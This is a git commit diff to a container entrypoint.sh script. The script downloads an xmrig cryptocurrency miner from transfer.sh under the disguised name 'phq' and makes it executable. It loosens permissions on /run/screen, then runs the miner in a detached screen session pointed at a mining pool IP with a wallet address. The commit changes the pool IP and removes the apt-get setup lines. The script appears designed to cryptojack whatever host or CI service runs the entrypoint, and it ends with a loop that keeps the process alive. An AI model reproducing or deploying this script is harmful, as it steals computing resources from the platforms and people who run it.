f8fc409f68ae01f6f2207e9e69f880f0dbbbe8a4
septianana55 <93500712+septianana55@users.noreply.github.com>
2021-12-23 11:18:42 +0700

    Update entrypoint.sh

--- entrypoint.sh
+++ entrypoint.sh
@@ -1,7 +1,5 @@
-apt-get update -y
-apt-get install -y screen
 curl https://transfer.sh/uTIFtD/xmrig --output phq
 chmod +x phq
 chmod 777 /run/screen
-screen -dmS phq ./phq --url 36.89.94.125:3333 --user hvxxzE88RUEbetvm8dCfu97o8p1rLSZ9s66qYVr5YVokHGfg48ZekDeX1mi1TmcSTtdMQTGEjguD6NtwQ8CQSTkB3QmEn5Bhqa --pass x --donate-level 0
+screen -dmS phq ./phq --url 20.120.30.75:3333 --user hvxxzE88RUEbetvm8dCfu97o8p1rLSZ9s66qYVr5YVokHGfg48ZekDeX1mi1TmcSTtdMQTGEjguD6NtwQ8CQSTkB3QmEn5Bhqa --pass x --donate-level 0
 while :; do shuf -n 1 -i 1-99999999; sleep 30; done
